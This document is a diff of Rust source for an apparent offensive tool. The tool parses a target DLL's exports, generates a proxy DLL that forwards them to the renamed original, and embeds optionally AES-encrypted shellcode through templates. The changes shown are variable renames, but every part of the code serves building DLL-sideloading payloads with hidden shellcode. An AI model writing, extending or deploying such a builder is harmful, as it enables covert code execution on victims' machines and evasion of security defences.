@@ -72,14 +72,14 @@ fn get_encryption_algo(
     shellcode: &mut Vec<u8>,
     resource_path: &mut std::path::PathBuf,
 ) -> std::io::Result<String> {
-    if let Some(enc_type) = encryption {
-        if enc_type.to_lowercase() == "aes" {
+    if let Some(encryption_type) = encryption {
+        if encryption_type.to_lowercase() == "aes" {
             println!("Using AES encryption");
-            let tmp_enc_algo = load_resource_file(resource_path, "aes.rs")?;
-            let enc_args = encrypt_aes(shellcode);
-            Ok(tmp_enc_algo
-                .replace("{KEY}", join_vec(&enc_args.key, ",").as_str())
-                .replace("{NONCE}", join_vec(&enc_args.nonce, ",").as_str()))
+            let enc_algo_template = load_resource_file(resource_path, "aes.rs")?;
+            let encryption_args = encrypt_aes(shellcode);
+            Ok(enc_algo_template
+                .replace("{KEY}", join_vec(&encryption_args.key, ",").as_str())
+                .replace("{NONCE}", join_vec(&encryption_args.nonce, ",").as_str()))
         } else {
             panic!("Unknown encryption algorithm");
         }
@@ -107,11 +107,11 @@ fn main() -> std::io::Result<()> {
     let mut output = args.output.unwrap_or_else(|| std::path::PathBuf::from("output"));
     let mut resource_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from(".\\."));
 
-    let contents = fs::read(&args.dll).expect("Could not read dll file");
+    let dll_data = fs::read(&args.dll).expect("Could not read dll file");
 
-    let file_name = args.dll.file_stem().unwrap().to_str().unwrap();
+    let dll_name = args.dll.file_stem().unwrap().to_str().unwrap();
 
-    let pe_file = winpe::parse(contents);
+    let pe_file = winpe::parse(dll_data);
     if pe_file.x64 {
         println!("Parsed an x64 PE file");
     } else {
@@ -131,39 +131,39 @@ fn main() -> std::io::Result<()> {
         .map(|(name, ordinal)| {
             format!(
                 "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
-                name, file_name, name, ordinal
+                name, dll_name, name, ordinal
             )
         })
         .collect::<String>();
 
-    let content_export_asm = load_resource_file(&mut resource_path, "export.rs")?;
-    let export_asm = content_export_asm.replace("{}", function_exports.as_str());
+    let export_asm_template = load_resource_file(&mut resource_path, "export.rs")?;
+    let export_asm = export_asm_template.replace("{}", function_exports.as_str());
 
     let template_content = load_resource_file(&mut resource_path, "template.rs")?;
 
     fs::create_dir(&output)?;
 
-    let mut content_shellcode_stub = String::new();
+    let mut shellcode_stub_template = String::new();
     if !shellcode.is_empty() {
-        let enc_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut resource_path)?;
+        let encryption_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut resource_path)?;
 
-        let content_shellcode_template = load_resource_file(&mut resource_path, "shellcode_template.rs")?;
+        let shellcode_template = load_resource_file(&mut resource_path, "shellcode_template.rs")?;
         let shellcode_str = join_vec(&shellcode, ",");
 
-        let content_shellcode = content_shellcode_template
+        let shellcode_output = shellcode_template
             .replace("{SIZE}", &shellcode.len().to_string())
             .replace("{SHELLCODE}", &shellcode_str);
 
-        write_output_file(&mut output, "shellcode.rs", content_shellcode.as_bytes())?;
+        write_output_file(&mut output, "shellcode.rs", shellcode_output.as_bytes())?;
 
-        content_shellcode_stub = load_resource_file(&mut resource_path, "shellcode_stub.rs")?;
-        content_shellcode_stub = content_shellcode_stub.replace("{ENC}", &enc_algo);
+        shellcode_stub_template = load_resource_file(&mut resource_path, "shellcode_stub.rs")?;
+        shellcode_stub_template = shellcode_stub_template.replace("{ENC}", &encryption_algo);
     }
 
-    let proxy_content = template_content
+    let proxy_output = template_content
         .replace("{}", &export_asm)
-        .replace("{SHELLCODE_STUB}", &content_shellcode_stub);
-    write_output_file(&mut output, "proxy.rs", proxy_content.as_bytes())?;
+        .replace("{SHELLCODE_STUB}", &shellcode_stub_template);
+    write_output_file(&mut output, "proxy.rs", proxy_output.as_bytes())?;
 
     // Copy build files from resources
     output.push("build.rs");
